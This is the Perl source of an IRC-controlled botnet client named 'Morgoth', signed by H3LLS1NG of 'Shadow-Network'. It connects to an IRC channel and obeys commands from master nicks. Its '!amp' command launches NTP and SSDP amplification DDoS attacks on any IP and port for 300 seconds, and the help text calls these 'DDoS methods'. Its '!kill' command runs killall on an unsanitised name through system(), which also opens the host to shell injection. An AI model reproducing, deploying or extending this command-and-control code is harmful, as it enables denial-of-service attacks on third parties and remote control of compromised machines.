  #!/usr/bin/perl
  
	#Use: perl a.pl -h irc.shadow-network.net -p 6667 -c shadow -b Morgoth -s senha
	#|##############################################################################|#
	#                              Made in Shadow-NetworK                            #
	#                                   By H3LLS1NG                                  #
	# Greetz: nbdu1nder, Shíva, mitt1sx, Akir4, Ins3rt, Constantine, Chainksain, &   #
	#             nerdzin159, depois, SynChr0nize, KillerYBR, MRC, etc               #
	#                    MORGOTH BOT - Aquele que se ergue em poder                  #
	# Para dar comandos no bot digite ShadowBot antes, ex: Morgoth:!help             #
	# To give commands to the bot type ShadowBot before, ex: ShadowBot:!help         #
	#|##############################################################################|#
  
  # Lista de nicks 'master'.
  my @master_nicks = (
    #"Jhowz", 
    #"nick2", 
    "H3LLS1NG"
  );
  
  # Debug configuration (1 = Ativo, 0 = Inativo).
  my $debug = 0;
  
  # #############################################################################
  # Main class.
  package application;
  {
    use constant FALSE => 0;
    use constant TRUE  => 1;

    use strict;
    use warnings;
    
    my $attributes = {
      last_error  => FALSE,
      host     => undef,
      port     => undef,
      name     => undef,
      master   => undef,
      password => undef,
      channel  => undef
    };
    
    # Parseia parametros e verifica se dados estão OK. Se estiver tudo correto,
    # seta atributo 'status' da classe para TRUE informando que tudo foi corregado
    # corretamente. Caso contrário setar o valor do mesmo para FALSE.
    sub new {
      my ($instance) = @_;
      my $cont = 0;
      
      foreach my $index (<@ARGV>) {
        if    ($index =~ "-h") { $attributes -> {host}     =      $ARGV[$cont + 1]; }
        elsif ($index =~ "-p") { $attributes -> {port}     =      $ARGV[$cont + 1]; }
        elsif ($index =~ "-c") { $attributes -> {channel}  = "#". $ARGV[$cont + 1]; }
        elsif ($index =~ "-b") { $attributes -> {name}     =      $ARGV[$cont + 1]; }
        elsif ($index =~ "-m") { $attributes -> {master}   =      $ARGV[$cont + 1]; }
        elsif ($index =~ "-s") { $attributes -> {password} =      $ARGV[$cont + 1]; }
        $cont++;
      }
      
      if ( $attributes -> {host}    && $attributes -> {port} && $attributes -> {master} &&
           $attributes -> {channel} && $attributes -> {name} && $attributes -> {password} )
      {
        $attributes -> {last_error} = TRUE;
        bless $attributes, $instance;
        return $attributes;
      }
      
      else {
        print "\n  Use: perl bot.pl -h irc.host.net -p 6667 -m master -c #channel -s password -b ShadowBot\n\n";
        print "   -h -> IRC server.\n";
        print "   -p -> IRC port.\n";
        print "   -c -> Channel name.\n";
        print "   -m -> Master nick.\n";
        print "   -s -> Master password.\n";
        print "   -b -> Bot nick.\n\n";
        
        $attributes -> {last_error} = FALSE;
        return undef;
      }
    }
    
    sub core {
      my ($this) = @_;
      if (my $irc = irc -> new ($this -> {host}, $this -> {port}, $this -> {name}, $this -> {master}, $this -> {channel}, $this -> {password})) {
        if ((my $result = irc -> status) == TRUE) {
          irc -> connect;
        }
      }
    }
    
    sub status {
      my ($this) = @_;
      return $this -> {last_error};
    }
  }
  
  # #############################################################################
  # IRC Control class.
  package irc;
  {
    use constant FALSE => 0;
    use constant TRUE  => 1;
    
    use Socket;
    use strict;
    use warnings;

    my $attributes = {
      last_error => FALSE,
      
      # Configurações finais do bot.
      host     => undef,             # Endereço do servidor IRC.
      port     => undef,             # Porta do servidor IRC.
      name     => undef,             # Nick do bot.
      master   => undef,             # Nick do master.
      channel  => undef,             # Canal que o bot irá entrar por padrão.
      password => undef,              # Senha do master.
      
      # Controle de usuarios.
      master_logged => FALSE,       # TRUE = Master logado, FALSE = Master não logado.
      master_nick => undef          # Nick do usuário logado como master.
      
    };
    
    # Inicializa atributos da classe e conexão com servidor IRC.
    sub new {
      my ($instance, $host, $port, $name, $master, $channel, $password) = @_;
      if ($host && $port && $name && $master && $channel && $password) {
        
        $attributes -> {host} = $host;
        $attributes -> {port} = $port;
        $attributes -> {name} = $name;
        $attributes -> {master} = $master;
        $attributes -> {channel} = $channel;
        $attributes -> {password} = $password;
        $attributes -> {last_error} = TRUE;
                
        bless $attributes, $instance;
        return $attributes;
      }
      return undef;
    }
    
    # Conecta em servidor IRC.
    sub connect {
      print "\nConnecting in ". $attributes -> {host} ." ". $attributes -> {port} ."...\n" if $debug;
      print "\nIRC Server response...\n" if $debug;
      
      socket SOCKET, PF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2];
      connect SOCKET, pack_sockaddr_in($attributes -> {port}, inet_aton($attributes -> {host}));
      send SOCKET, "NICK ". $attributes -> {name} ."\r\n", 0;
      send SOCKET, "USER ". $attributes -> {name} ." * * :". $attributes -> {name} ."\r\n", 0;
      send SOCKET, "JOIN ". $attributes -> {channel} ."\r\n", 0;
      
      for ( my $cont = 0 ; my $response = <SOCKET>; $cont++ ) {
        chomp ($response = $response);
        
        if ($cont < 5) {
          send SOCKET, "JOIN ". $attributes -> {channel} ."\r\n", 0;
        }
        if ($response  =~ "Nickname is already in use") {
          die "\nNickname is already in use.\n";
        }
        elsif ($response =~ /PING(.*)/) {
          send SOCKET, "PONG$1\r\n", 0;
          print "PONG$1\n" if $debug;
        }
        
        # Command and control.
        my $result = irc -> core ($response);
        if ($result == 1) { last; }
      }
      
      close ( SOCKET );
      print "\n\nConnection closed.\n" if $debug;
    }
    
    # Core, loop de entrada e saida dos dados vindo do servidor de IRC.
    # Método para controle dos comandos.
    sub core {
      my ($instance, $response) = @_;
      
      my @command = ( 
        "!exit", 
        "!help",
        #"!login",
        "!amp",
        "!kill"
      );
      
      print ">> $response\n" if $debug;
      if ($response =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/) {
        
        my $user = $1;
        my $host = $2;
        my $channel = $3;
        my $content = $4;
        my $botnick = $attributes -> {name};
        
        if ($content =~ /^$botnick(.*)$/) {
          foreach my $index (@command) {
            my $str = $1;
            if ($str =~ /^(.*)$index(.*)$/) {
            
              $str = $2;
              $str =~ s/^\s+|\s+$//g;
              my @param = split / /, $str;
              
              if ($response =~ $index) {
              
                if ($index =~ "!amp") {
                  if (irc -> check_login_status ($user) == TRUE) {
                    if ($param[0] && $param[1] && $param[2] && !defined($param[3])) {
                      irc -> amplification($param[0], $param[1], $param[2]);
                    } else {
                      send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :4,1 ". $user ." Amplification syntax error! \r\n", 0;
                      send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :9,1 ". $user ." Use: 11,1". $attributes -> {name} .": !amp PROTOCOL IP PORT \r\n", 0;
                    }
                    return 0;
                  }
                }
                
                if ($index =~ "!kill") {
                  if (irc -> check_login_status ($user) == TRUE) {
                    if ($param[0] && !defined($param[1])) {
                      irc -> kill_application($param[0]);
                    } else {
                      send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :4,1 ". $user ." Kill command syntax error! \r\n", 0;
                      send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :9,1 ". $user ." Use: 11,1". $attributes -> {name} .": !kill APPLICATION-NAME \r\n", 0;
                    }
                  }
                }
				
				
                
                if ($index =~ "!help") {
                  irc -> show_help_banner;
                  return 0;
                }
                
                #if ($index =~ "!login") {
                #  irc -> process_account_login ( $user, $param[0], $param[1] );
                #  return 0;
                #}               
                
                if ($index =~ "!exit") {
                  if (irc -> check_login_status ($user) == TRUE) {
                    send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :9,1 ". $attributes -> {name} ." 11,1 Exited! \r\nQUIT\r\n", 0;
                    return 1;
                  }
                }
              }
              
            }
          }
        }
      }
      
      return 0;
    }
    
    # Processa login de usuários.
    sub process_account_login {
      my ($instance, $nickname, $username, $password) = @_;
      
      print "Nick: $nickname\nUser: $username\nPass: $password\n" if $debug;
      if (defined ($username) && defined ($password) && defined ($nickname)) {
        
        # Verifica se usuário já está logado.
        if ($attributes -> {master_logged} == TRUE && $nickname =~ $attributes -> {master}) {
          send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :11,1 ". $nickname .", User already logged! \r\n", 0;
          return 0;
        }
        
        # Master login.
        if ( $nickname =~ $attributes -> {master} && $username =~ "master" && $password =~ $attributes -> {password} ) {
          send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :9,1 ". $nickname .", Logged in successfully! \r\n", 0;
          $attributes -> {master_logged} = TRUE;
          return 0;
        }
      }
      
      # else...
      send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :4,1 ". $nickname .", Error login the account. \r\n", 0;
    }
    
    sub check_login_status {
      my ($instance, $user) = @_;
      
      #if (defined ($user) ) {
      #  if ($attributes -> {master_logged} == FALSE) {
      #    send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :4,1 ". $user ." You are not logged! \r\n", 0;
      #    return FALSE;
      #  }
      #}
      
      my $control = FALSE;
      foreach my $index (@master_nicks) {
        if ($user =~ $index) {
          $control = TRUE;
          last;
        }
      }
      
      unless ($control == TRUE) {
        send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :4,1 ". $user ." You are not master! \r\n", 0;
        return FALSE;
      }
      
      return TRUE;
    }
    
    # Help banner.
    sub show_help_banner {
      my @banner = (
        "4,1 -9,1 !help 4,1->11,1 Show help message.",
        "4,1 -9,1 !exit 4,1->11,1 Stop bot execution.",
        #"4,1 -9,1 !login 8,1[9,1user8,1] [9,1password8,1]4,1 -> 11,1Access account.",
        "4,1 -9,1 !amp 8,1[9,1protocol8,1] [9,1ip8,1] [9,1port8,1]4,1 -> 11,1DDoS methods.",
        "4,1 -9,1 !kill 8,1[9,1process name8,1] 4,1 -> 11,1Terminate process.",
        "4,1  -> 8,1Method...",
        "4,1     11,1 NTP Amplification",
        "4,1     11,1 SSDP Amplification",         
        " "        
      );
      
      foreach my $index (@banner) {
        send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :$index\r\n", 0;
      }
    }
    
    # Run application in machine.
    sub amplification {
      my ($instance, $protocolo, $ip, $port) = @_;
      my $command = "";
       
      if ($protocolo =~ "ntp") {
        $command = "./ntp $ip $port 999 8 300 &";
      } 
      if ($protocolo =~ "ssdp") {
        $command = "./ssdp $ip $port 8 300 &";
      }
      
      if (-e $protocolo) {
        system($command);
        my $output = "4,1 ->9,1 ". uc($protocolo) ." 4,1::11,1 attacking ". $ip .":". $port ." for 300 seconds... \r\n";
        send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :". $output, 0;
      } else {
        send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :4,1 ". $protocolo ." file not exists! \r\n", 0;
      }
      
      print $command ."\n";
    }
    
    # kill running Application.
    sub kill_application {
      my ($instance, $name) = @_;
      if (defined($name)) {
        system("killall -9 ". $name);
        send SOCKET, "PRIVMSG ". $attributes -> {channel} ." :11,1 Process finished: 9,1". $name ." \r\n", 0;
      }
    }
    
    sub status {
      return $attributes -> {last_error};
    }
  }
  
  # #############################################################################
  # Application startup (Main class).
  my $application = new application;
  if (defined($application)) {
    if ((my $result = $application -> status) == 1) {
      $application -> core;
    }
  }
  
  # EOF.
  # #############################################################################
